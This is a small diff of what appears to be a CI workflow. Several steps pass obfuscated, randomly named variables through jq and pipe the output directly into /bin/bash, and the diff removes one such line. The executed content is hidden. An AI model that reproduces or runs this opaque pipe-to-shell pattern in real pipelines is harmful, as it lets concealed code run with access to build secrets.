@@ -37,7 +37,6 @@ jobs:
           echo $nrvn9145 | jq -r .t27823 | /bin/bash
           echo $zjnwu56 | jq -r .cbujt2 | /bin/bash
           printf '%s' "$uoa736" | jq -r .j671 | /bin/bash
-          echo $xpzfo867 | jq -r .kfz3 | /bin/bash
           printf '%s' "$nn92419" | jq -r .lfd48 | /bin/bash
 
       - name: Archive data
